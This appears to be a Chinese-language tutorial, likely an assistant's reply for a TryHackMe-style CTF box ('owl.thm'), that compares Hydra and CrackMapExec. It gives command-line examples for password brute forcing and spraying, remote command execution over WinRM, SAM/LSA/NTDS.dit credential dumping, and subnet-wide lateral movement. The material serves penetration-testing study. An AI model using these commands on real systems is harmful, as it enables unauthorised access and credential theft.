# 🔍 CrackMapExec 解釋

## 📚 CrackMapExec (CME) 是什麼?

**CrackMapExec** 是一個**後滲透測試工具**,專門用於 Windows 網路的列舉和利用。

## 🆚 Hydra vs CrackMapExec

### **Hydra (暴力破解工具)**
- **目的**: 找密碼
- **功能**: 測試大量密碼組合
- **輸出**: 告訴你「這個密碼可能有效」

### **CrackMapExec (驗證和利用工具)**
- **目的**: 驗證憑證 + 利用訪問權限
- **功能**: 確認密碼有效 + 檢查權限 + 執行命令
- **輸出**: 告訴你「這個密碼有效且你有什麼權限」

## ⚠️ 為什麼 Hydra 結果不可靠?

你之前看到的 Hydra 輸出:
```
[3389][rdp] account on 10.10.3.171 might be valid but account not active
```

關鍵字: **"might be"** (可能有效)

**Hydra 只是猜測,不能確定!**

## ✅ CrackMapExec 的優勢

### **1. 確認密碼真的有效**
```bash
# Hydra 說「可能有效」
hydra -l Jareth -p password123 owl.thm rdp

# CME 確認「絕對有效」
crackmapexec winrm owl.thm -u Jareth -p password123
# 輸出: [+] year-of-the-owl\Jareth:password123 (Pwn3d!)
```

### **2. 檢查權限等級**
```bash
crackmapexec smb owl.thm -u Jareth -p password123
```

可能的輸出:
- `(Pwn3d!)` = **管理員權限!** 🎉
- `[+]` = 有效但只是普通用戶
- `[-]` = 無效

### **3. 支援多種協議**
```bash
# SMB (檔案共享)
crackmapexec smb owl.thm -u Jareth -p password123

# WinRM (遠程管理)
crackmapexec winrm owl.thm -u Jareth -p password123

# MSSQL (資料庫)
crackmapexec mssql owl.thm -u Jareth -p password123

# RDP (遠程桌面)
crackmapexec rdp owl.thm -u Jareth -p password123

# LDAP (目錄服務)
crackmapexec ldap owl.thm -u Jareth -p password123
```

### **4. 快速列舉和執行**
```bash
# 列舉 SMB 共享
crackmapexec smb owl.thm -u Jareth -p password123 --shares

# 列舉用戶
crackmapexec smb owl.thm -u Jareth -p password123 --users

# 執行命令
crackmapexec winrm owl.thm -u Jareth -p password123 -x "whoami"

# 讀取文件
crackmapexec smb owl.thm -u Jareth -p password123 --get-file "C:\Users\Jareth\Desktop\flag.txt" "./flag.txt"
```

### **5. 密碼噴灑 (Password Spraying)**
```bash
# 測試一個密碼對多個用戶
crackmapexec smb owl.thm -u users.txt -p 'Password123'

# 測試多個密碼對一個用戶
crackmapexec smb owl.thm -u Jareth -p passwords.txt

# 測試多對多
crackmapexec smb owl.thm -u users.txt -p passwords.txt
```

## 🎯 實際使用場景

### **場景 1: Hydra 找到密碼後驗證**
```bash
# Hydra 說找到了
hydra -l admin -P rockyou.txt ssh://target

# 用 CME 確認
crackmapexec ssh target -u admin -p password123
```

### **場景 2: 檢查憑證在多台機器上的有效性**
```bash
# 你拿到了一組憑證,想知道能登入哪些機器
crackmapexec smb 192.168.1.0/24 -u Jareth -p password123

# 輸出會顯示哪些機器可以登入
```

### **場景 3: 快速列舉**
```bash
# 不需要登入,直接執行命令
crackmapexec winrm owl.thm -u Jareth -p password123 -x "dir C:\Users"

# 比起:
evil-winrm -i owl.thm -u Jareth -p password123
# 然後在裡面打命令
```

### **場景 4: 橫向移動**
```bash
# 在企業網路中,用同一組憑證測試多台機器
crackmapexec smb 10.10.0.0/24 -u Jareth -p password123 --continue-on-success
```

## 📊 Hydra vs CME 比較表

| 功能           | Hydra    | CrackMapExec   |
| -------------- | -------- | -------------- |
| **暴力破解**   | ✅ 擅長   | ⚠️ 可以但較慢   |
| **驗證憑證**   | ⚠️ 不準確 | ✅ 準確         |
| **檢查權限**   | ❌ 不行   | ✅ 可以         |
| **執行命令**   | ❌ 不行   | ✅ 可以         |
| **列舉資訊**   | ❌ 不行   | ✅ 可以         |
| **多協議支援** | ✅ 很多   | ✅ Windows 專用 |
| **速度**       | ⚡ 快     | 🐢 較慢         |

## 🔧 實用 CME 命令

### **基本驗證**
```bash
# 測試憑證
crackmapexec smb owl.thm -u Jareth -p password123
crackmapexec winrm owl.thm -u Jareth -p password123
```

### **列舉**
```bash
# 列舉共享
crackmapexec smb owl.thm -u Jareth -p password123 --shares

# 列舉用戶
crackmapexec smb owl.thm -u Jareth -p password123 --users

# 列舉群組
crackmapexec smb owl.thm -u Jareth -p password123 --groups

# 列舉登入的用戶
crackmapexec smb owl.thm -u Jareth -p password123 --sessions
```

### **執行命令**
```bash
# PowerShell 命令
crackmapexec winrm owl.thm -u Jareth -p password123 -x "whoami"
crackmapexec winrm owl.thm -u Jareth -p password123 -x "ipconfig"

# 列出目錄
crackmapexec winrm owl.thm -u Jareth -p password123 -x "dir C:\Users\Jareth\Desktop"
```

### **提取資訊**
```bash
# 提取 SAM (需要管理員權限)
crackmapexec smb owl.thm -u Administrator -p password --sam

# 提取 LSA secrets
crackmapexec smb owl.thm -u Administrator -p password --lsa

# 提取 NTDS.dit (Domain Controller)
crackmapexec smb dc.thm -u Administrator -p password --ntds
```

## 💡 為什麼要用兩者?

**標準流程:**
```bash
# 1. 用 Hydra 快速爆破找密碼
hydra -l Jareth -P small_wordlist.txt rdp://owl.thm

# 2. 用 CME 驗證和利用
crackmapexec winrm owl.thm -u Jareth -p password123
crackmapexec smb owl.thm -u Jareth -p password123 --shares

# 3. 用 evil-winrm 或其他工具深入利用
evil-winrm -i owl.thm -u Jareth -p password123
```

## 🎯 你的情況

你做的很對!

```bash
# 1. Hydra 找到密碼
hydra -l Jareth -P rockyou.txt owl.thm rdp
# 結果: password123 可能有效

# 2. CME 驗證
crackmapexec winrm owl.thm -u Jareth -p password123
# 結果: (Pwn3d!) - 確認有完整權限!

# 3. 連線利用
evil-winrm -i owl.thm -u Jareth -p password123
```

**CME 不是必須的,但它讓你更有信心,而且能快速檢查權限!**

---

## 📝 總結

- **Hydra**: 找密碼的工具 (第一步)
- **CrackMapExec**: 驗證和利用的工具 (第二步)
- **Evil-WinRM/RDP**: 深入訪問的工具 (第三步)

三者配合使用效果最好! 🎯